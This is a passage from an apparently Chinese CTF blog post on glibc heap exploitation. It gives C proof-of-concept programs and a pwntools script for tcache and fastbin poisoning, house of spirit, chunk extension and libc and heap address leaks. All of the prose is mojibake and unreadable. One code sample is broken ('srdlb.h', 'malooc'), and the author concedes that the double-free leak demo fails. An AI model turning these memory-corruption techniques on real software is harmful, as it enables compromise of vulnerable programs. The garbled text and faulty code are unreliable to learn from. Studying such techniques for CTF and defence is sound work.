class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fck[<span class="hljs-number">4</span>];<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// åˆå§‹åŒ–å †ç¯å¢ƒ</span><br>    <br>    <span class="hljs-comment">// ä¼ªé€ å‡å †å—ï¼Œè¯•å›¾é‡Šæ”¾åå†æ¬¡åˆ†é…å¾—åˆ°è¯¥åœ°å€çš„å †å—</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fck addr is %p\n&quot;</span>, fck+<span class="hljs-number">2</span>);<br>    fck[<span class="hljs-number">1</span>] = <span class="hljs-number">0x90</span>;<br>    <span class="hljs-built_in">free</span>(fck+<span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;now malloc addr is %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcacheHouseOfSpirit.png"></p><h4 id="æ³„éœ²åœ°å€"><a href="#æ³„éœ²åœ°å€" class="headerlink" title="æ³„éœ²åœ°å€"></a>æ³„éœ²åœ°å€</h4><p>åœ¨åšå †é¢˜æ—¶ï¼Œç»å¸¸ä¼šé‡åˆ°ä¿æŠ¤å…¨å¼€çš„æƒ…å†µï¼Œç‰¹åˆ«æ˜¯åœ°å€éšæœºåŒ–ä¿æŠ¤PIEï¼Œæˆ–è€…é¢˜ç›®æœ¬èº«æ²¡æœ‰æ˜æ˜¾å¯åˆ©ç”¨çš„æ‰“å°å‡½æ•°ï¼Œè¿™æ—¶å°±éœ€è¦é‡‡å–ä¸€äº›æœºåˆ¶æ¥æ³„éœ²å‡ºlibcåœ°å€æˆ–è€…å †åœ°å€ç­‰ã€‚</p><h5 id="æ³„éœ²libcåœ°å€"><a href="#æ³„éœ²libcåœ°å€" class="headerlink" title="æ³„éœ²libcåœ°å€"></a>æ³„éœ²libcåœ°å€</h5><p>æ³„éœ² libc åˆ©ç”¨çš„å°±æ˜¯ bin ä¸­åŒå‘é“¾è¡¨çš„æ€§è´¨ï¼Œå½“ä¸€ä¸ªå †å—è¢«åŠ å…¥é“¾è¡¨æ—¶ï¼Œå®ƒçš„ fd å’Œ bk æŒ‡é’ˆä¼šæŒ‡å‘ libc ä¸­çš„åœ°å€ã€‚åœ¨â€œç»•è¿‡ tcacheâ€ä¸­æˆ‘ä»¬å°±æ˜¯åˆ©ç”¨äº†è¿™ä¸ªç‰¹æ€§æ¥æ³„éœ²çš„ libc åœ°å€ã€‚</p><p>è¿˜æœ‰æ›´åŠ ç›´æ¥çš„æ–¹æ³•ï¼Œåªéœ€è¦è®©åˆ†é…å’Œé‡Šæ”¾çš„chunk å¤§äºç­‰äº 0x410å­—èŠ‚ï¼ˆè¶…è¿‡ tcache çš„èŒƒå›´ï¼‰å³å¯ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™æ—¶æˆ‘ä»¬éœ€è¦é˜²æ­¢é‡Šæ”¾çš„å †å—å’Œ top chunk åˆå¹¶ã€‚</p><p>åŸç†å¤§è‡´å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> * ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);  <span class="hljs-comment">// é˜²æ­¢å †å—åˆå¹¶</span><br>    <span class="hljs-built_in">free</span>(ptr);  <span class="hljs-comment">//é‡Šæ”¾çš„å †å—è¿›å…¥ unsorted bin</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak libc addr is %p\n&quot;</span>, (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcachelibc.png"></p><h5 id="æ³„éœ²-heap-åœ°å€"><a href="#æ³„éœ²-heap-åœ°å€" class="headerlink" title="æ³„éœ² heap åœ°å€"></a>æ³„éœ² heap åœ°å€</h5><p>é™¤äº†æ³„éœ² libc åœ°å€ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥æ³„éœ² heap åœ°å€ã€‚åœ¨æ³„éœ²å †åœ°å€ä»¥åï¼Œæˆ‘ä»¬ç¡®å®šå¥½ç›®æ ‡åœ°å€çš„åç§»ï¼Œå†é€šè¿‡ä¿®æ”¹ tcache bin çš„ fd æŒ‡é’ˆï¼Œå°±å¯ä»¥åœ¨ä¸‹æ¬¡åˆ†é…æ—¶åˆ†é…åˆ°æˆ‘ä»¬æƒ³è¦çš„å †å—ã€‚</p><blockquote><p>åœ¨ libc-2.28 ä¸­ï¼Œå¢åŠ äº†å¯¹ tcache äºŒæ¬¡é‡Šæ”¾çš„æ£€æŸ¥ï¼Œæ‰€ä»¥æ­¤ç§æ”»å‡»æ–¹æ³•åœ¨ libc-2.28 åŠå…¶æ›´é«˜ç‰ˆæœ¬ä¸­å¤±æ•ˆ</p></blockquote><p>åŸç†å¤§è‡´å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">free</span>(ptr);<br>    <span class="hljs-built_in">free</span>(ptr);  <span class="hljs-comment">// double free !!</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;heap addr is %p\n&quot;</span>, ptr[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>double free é”™è¯¯æç¤ºäº†ï¼Œæ¢äº†ä¸‰ä¸ªç‰ˆæœ¬çš„ Libc éƒ½æœ¨æœ‰ç”¨ï¼Œå…ˆæ”¾ç€ç¢°åˆ°é¢˜ç›®å†è¯´ğŸ«¥</p></blockquote><p>è¿˜æœ‰å¦ä¸€ç§æ–¹æ³•ï¼Œæˆ‘ä»¬åˆ©ç”¨ malloc ä¸ä¼šæ¸…é™¤å†…å­˜ç©ºé—´çš„ç‰¹æ€§ä»¥åŠ printf æ ¼å¼åŒ–å­—ç¬¦ä¸²é‡åˆ°å­—ç¬¦ â€œ\x00â€ æ‰ä¼šåœæ­¢çš„ç‰¹æ€§å»æ³„éœ² heap base ã€‚</p><p>é¢˜ç›®ç¤ºä¾‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">free</span>(p2);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    read(<span class="hljs-number">0</span>, p3, <span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, p3);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./heap&quot;</span>)<br>p.send(<span class="hljs-string">&quot;a&quot;</span>)<br>info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(info)<br>info = u64(info.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>heap_base = info &amp; <span class="hljs-number">0xfffffffffffff000</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;heap base: &quot;</span>, <span class="hljs-built_in">hex</span>(heap_base))<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcacheheap_exp.png"></p><h5 id="åˆ©ç”¨-tcache-bin-è®°å½•å †å—æ³„éœ²åœ°å€"><a href="#åˆ©ç”¨-tcache-bin-è®°å½•å †å—æ³„éœ²åœ°å€" class="headerlink" title="åˆ©ç”¨ tcache bin è®°å½•å †å—æ³„éœ²åœ°å€"></a>åˆ©ç”¨ tcache bin è®°å½•å †å—æ³„éœ²åœ°å€</h5><p>æœ‰çš„æ—¶å€™é¢˜ç›®ä¼šé™åˆ¶freeçš„æ¬¡æ•°ï¼Œæˆ‘ä»¬æ— æ³•é€šè¿‡å¤šæ¬¡é‡Šæ”¾æ¥å¡«æ»¡ tcache bin ã€‚è¿™ç§æƒ…å†µæˆ‘ä»¬å°±å¯ä»¥ç»“åˆ tcache bin çš„ç‰¹æ€§ã€‚æˆ‘ä»¬çŸ¥é“ï¼Œåœ¨åˆå§‹åŒ–å †çš„æ—¶å€™ï¼Œ tcache bin ä¼šç”Ÿæˆä¸€å— 0x250 å¤§å°çš„å †å—æ¥è®°å½•å±äº tcache bin å¤§å°çš„å †å—ä¿¡æ¯ã€‚æˆ‘ä»¬ä¿®æ”¹è¿™é‡Œçš„è®°å½•ï¼Œå°±å¯ä»¥æŠŠåç»­é‡Šæ”¾çš„å †å—æ”¾è¿› unsorted bin ä¸­ã€‚</p><p>æ–¹æ³•ä¸€ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr;<br><br>    ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<br><br>    <span class="hljs-comment">// double free</span><br>    <span class="hljs-built_in">free</span>(ptr);<br>    <span class="hljs-built_in">free</span>(ptr);<br><br>    <span class="hljs-comment">// malloc 3 ==&gt; tcache bin count = -1</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">free</span>(ptr);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸Šæ–¹ä»£ç ä¸­ï¼Œæˆ‘ä»¬é€šè¿‡åˆ©ç”¨ double free è®©ä¸€ä¸ªå †å—è‡ªèº«æ„æˆå¾ªç¯ï¼Œç„¶å malloc 3æ¬¡åå°±å¯ä»¥è®© tcache bin çš„è®°å½•å˜ä¸º -1ï¼Œç”±äº libc æºä»£ç æ˜¯è®¤å®šä¸ºæ— ç¬¦å·æ•´å‹æ‰€ä»¥æ­¤æ—¶ä¹Ÿå°±æ˜¯ä¸€ä¸ªéå¸¸å¤§çš„æ•°ï¼Œè‡ªç„¶ä¹Ÿå°±è®¤ä¸ºè¯¥ tcache bin æ˜¯è¢«å¡«æ»¡äº†çš„ã€‚æœ€åå† free ç›¸åŒå¤§å°çš„å †å—ï¼Œå°±ä¼šè¢«é‡Šæ”¾åˆ°ç›¸åº”çš„binä¸­ã€‚<br>æ–¹æ³•äºŒï¼š</p><p>ç›´æ¥ä¿®æ”¹è®°å½•ä¿¡æ¯ã€‚åˆ©ç”¨double freeæ³„éœ²å‡ºheapåœ°å€ï¼Œè®¡ç®—åç§»å¹¶æ±‚å‡ºè®°å½•è¯¥tcache binçš„åœ°å€ï¼Œç„¶ååˆ©ç”¨tcache bin poisonå°†å †å—åˆ†é…åˆ°è¿™é‡Œè¿›è¡Œä¿®æ”¹ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;srdlb.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr;<br>    <br>    ptr = malooc(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<br>    ptr[<span class="hljs-number">-74</span>]=<span class="hljs-number">0x0700000000000000</span>;    <span class="hljs-comment">//è¿™é‡Œæ˜¯æˆ‘ä»¬è‡ªå·±è®¡ç®—å‡ºçš„åç§»</span><br>    <span class="hljs-built_in">free</span>(ptr);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸Šæ–¹ä»£ç ä¸­æˆ‘ä»¬å°†è®°å½•å—ä¿®æ”¹ä¸º0x07è¿™æ ·å°±ä¼šè¢«è®¤ä¸ºæ˜¯å·²ç»å¡«æ»¡äº†ä¸ƒå—å †å—ï¼Œä¸‹ä¸€ä¸ª free æ‰çš„å †å—å°±ä¼šè¿›å…¥ç›¸åº”çš„åŒºåŸŸã€‚</p><h4 id="tcache-extend"><a href="#tcache-extend" class="headerlink" title="tcache extend"></a>tcache extend</h4><p>å…¶å®å°±æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡é‡Šæ”¾å †å—åå¯¹å…¶æ•°æ®è¿›è¡Œä¿®æ”¹ã€‚å…¶ä¸­ç”±äºtcacheæœºåˆ¶çš„åŠ å…¥ä½¿å¾—æ¼æ´åˆ©ç”¨æ›´ç®€å•ã€‚chunk extend ä¹Ÿæ›´åŠ çš„è½»æ¾ï¼Œåªéœ€è¦ä¿®æ”¹å½“å‰chunkçš„sizeï¼Œæˆ‘ä»¬freeå†mallocåå°±å¯ä»¥è·å¾—å¯¹åº”å¤§å°çš„chunkã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;addr is %p, size is %p\n&quot;</span>, p1, p1[<span class="hljs-number">-1</span>]);<br>    p1[<span class="hljs-number">-1</span>] = <span class="hljs-number">0xa1</span>;<br>    <span class="hljs-built_in">free</span>(p1);<br>    p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;addr is %p, size is %p\n&quot;</span>, p1, p1[<span class="hljs-number">-1</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcache_extend2.png"></p><h1 id="Fastbin-attack"><a href="#Fastbin-attack" class="headerlink" title="Fastbin attack"></a>Fastbin attack</h1><blockquote><p>è¿™ä¸€éƒ¨åˆ†æˆ‘çš„ç¯å¢ƒæ˜¯ ubuntu16 libc2.23</p></blockquote><p>ç®€å•å›é¡¾ä¸€ä¸‹ fast bin çš„ç‰¹æ€§ï¼š</p><ul><li>å±äºfast bin çš„ chunk å¤§å°åœ¨ 64 ä½ä¸‹æ˜¯ 0x20-0x80ï¼Œæ¯ä¸€æ¡ bin é“¾è¡¨ä»¥ 0x10 é€’å¢ï¼Œå…±è®¡ä¸ƒæ¡é“¾ï¼›32 ä½æ˜¯ 0x10-0x40 ï¼Œä»¥ 0x8 é€’å¢ã€‚</li><li>fast bin æ˜¯å•é“¾è¡¨ä¸”å…ˆè¿›åå‡ºï¼Œå°±æ˜¯è¯´åœ¨ fast bin ä¸­åªæœ‰ fd æŒ‡é’ˆä¼šè¢«ä½¿ç”¨ã€‚</li><li>å±äº fast bin çš„ chunk è¢«é‡Šæ”¾æ—¶ä¸ä¼šè¢« unlink ï¼Œä¸ä¼šå’Œå †å—è¿›è¡Œåˆå¹¶ï¼Œå³ä½¿ç´§é‚» Top chunkã€‚</li></ul><h3 id="fast-bin-posioning"><a href="#fast-bin-posioning" class="headerlink" title="fast bin posioning"></a>fast bin posioning</h3><blockquote><p>å…¶å®å’Œä¹‹å‰ tcache çš„æ–¹æ³•æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡æˆ‘ä»¬ç°åœ¨çš„ç¯å¢ƒæ˜¯ libc2.23 æ²¡æœ‰ tcacheğŸ˜Š</p></blockquote><p>è¿™ç§æ”»å‡»æ–¹æ³•çš„ç›®çš„å°±æ˜¯å°†å †å—åˆ†é…åˆ°æˆ‘ä»¬æƒ³è¦æ§åˆ¶çš„å†…å­˜åŒºåŸŸï¼Œå†é€šè¿‡é¢˜ç›®æ‰€ç»™çš„ç¼–è¾‘å †å—çš„åŠŸèƒ½æ¥ä¿®æ”¹è¿™ä¸€éƒ¨åˆ†çš„å†…å­˜åŒºåŸŸã€‚</p><p>å®ç°æ”»å‡»ç›®æ ‡ï¼Œé¦–å…ˆè¦åœ¨ç›®æ ‡åŒºåŸŸä¸ºé€ å‡ºä¸€ä¸ªå †å—ï¼Œå°†ä¼ªé€ å †å—çš„sizeå¤§å°è®¾ç½®ä¸ºè¦ç”³è¯·çš„chunkå¤§å°+0x10ï¼Œç„¶åå°†ä¼ªé€ å †å—çš„åœ°å€å¡«å…¥å¯¹åº”å¤§å°çš„biné“¾ä¸­ï¼Œä¹‹åæ­£å¸¸ç”³è¯·å †å—å³å¯ã€‚</p><p>å¤§è‡´åŸç†å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fck[<span class="hljs-number">4</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;stack addr is %p\n&quot;</span>, fck);<br><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">free</span>(ptr);<br>    fck[<span class="hljs-number">1</span>] = <span class="hljs-number">0x21</span>;           <br>    ptr[<span class="hljs-number">0</span>] = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fck;  <span class="hljs-comment">//æŠŠfckæŒ‡é’ˆå†™å…¥fdæŒ‡é’ˆ</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the original heap %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;alloc to the stack %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastbp.png"></p><p>å¦‚ä¸Šä»£ç ï¼Œæˆ‘ä»¬ä¿®æ”¹äº† fd æŒ‡é’ˆï¼Œä½¿å¾— fd æŒ‡é’ˆæŒ‡å‘äº† ptr[0]ã€‚è¿™æ ·æˆ‘ä»¬å†æ¬¡åˆ†é…å¤§å°ä¸º 0x10 çš„å †å—æ—¶ï¼Œä¼šä»è¢«ä¿®æ”¹çš„ fd æŒ‡é’ˆæŒ‡å‘çš„åœ°å€å¤„è·å–å †å—ï¼Œå¹¶è¿”å›ç»™æˆ‘ä»¬ã€‚</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastbp_gdb1.png"></p><blockquote><p>å› ä¸ºæˆ‘ä»¬å†™å…¥åˆ° fd æŒ‡é’ˆçš„æ˜¯ fck çš„åœ°å€ï¼Œä¹Ÿå°±æ˜¯ä¼ªé€ å †å—çš„å¤´åœ°å€ï¼Œè€Œ malloc è¿”å›çš„æ˜¯ç”¨æˆ·æ•°æ®åœ°å€ï¼Œæ‰€ä»¥ä¸¤ä¸ªåœ°å€ç›¸å·®0x10</p></blockquote><h3 id="fast-bin-house-of-spirit"><a href="#fast-bin-house-of-spirit" class="headerlink" title="fast bin house of spirit"></a>fast bin house of spirit</h3><p>House of Spirit è¿™ç§æŠ€æœ¯çš„æ ¸å¿ƒåœ¨äºåœ¨ç›®æ ‡ä½ç½®å¤„ä¼ªé€  fastbin chunkï¼Œå¹¶å°†å…¶é‡Šæ”¾ï¼Œä»è€Œè¾¾åˆ°åˆ†é…æŒ‡å®šåœ°å€çš„ chunk çš„ç›®çš„ã€‚</p><p>æˆ‘ä»¬éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç³»ç»Ÿå¯¹ chunk ä¼šæœ‰ç›¸åº”çš„æ£€æŸ¥ï¼Œæˆ‘ä»¬éœ€è¦ç»•è¿‡æ£€æŸ¥ã€‚ç›¸å…³æ•°æ®å¦‚ä¸‹ï¼š</p><ul><li><p>fake chunk çš„ IS_MAPPED ä¸èƒ½ä¸º 1</p><p>è¿™ä¸ªæ ‡å¿—ä½ä½äºsizeä½äºŒæ¯”ç‰¹ä½ã€‚æ ‡å¿—ä½æ˜¯ 1 ä»£è¡¨å †å—ç”± mmap åˆ†é…ï¼Œè€Œ mmap åˆ†é…çš„å †å—ä¸è¿›å…¥ fast bin ç®¡ç†ã€‚</p></li><li><p>åœ°å€å¯¹é½</p><p>æ¯”å¦‚32ä½ç¨‹åºçš„è¯fake_chunkçš„prev_sizeæ‰€åœ¨åœ°å€å°±åº”è¯¥ä½ <code>0xXXXX0</code> æˆ– <code>0xXXXX4</code>ã€‚64ä½çš„è¯åœ°å€å°±åº”è¯¥åœ¨ <code>0xXXXX0</code> æˆ– <code>0xXXXX8</code> ã€‚</p></li><li><p>å¤§å°å¯¹é½</p><p>éœ€è¦æ»¡è¶³ fsat bin çš„å°ºå¯¸è¦æ±‚ï¼Œå¤§å°ä¸èƒ½å¤§äº0x80ã€‚</p></li><li><p>next chunk çš„å¤§å°ä¸èƒ½å°äº 2 * SIZE_SZï¼ŒåŒæ—¶ä¹Ÿä¸èƒ½å¤§äº av-&gt;system_mem</p><p>æœ€å¤§ä¸èƒ½è¶…è¿‡ av-&gt;system_mem ï¼Œå³ 128kbã€‚next_chunk çš„å¤§å°ä¸€èˆ¬æˆ‘ä»¬ä¼šè®¾ç½®æˆä¸ºä¸€ä¸ªè¶…è¿‡ fast bin æœ€å¤§çš„èŒƒå›´çš„ä¸€ä¸ªæ•°ï¼Œä½†è¦å°äº 128kbï¼Œè¿™æ ·åšçš„ç›®çš„æ˜¯åœ¨ chunk è¿ç»­é‡Šæ”¾çš„æ—¶å€™ï¼Œèƒ½å¤Ÿä¿è¯ä¼ªé€ çš„ chunk åœ¨é‡Šæ”¾åèƒ½å¤ŸæŒ‚åœ¨ fast bin ä¸­ main_arena çš„å‰é¢ï¼Œè¿™æ ·ä»¥æ¥æˆ‘ä»¬å†ä¸€æ¬¡ç”³è¯·ä¼ªé€  chunk 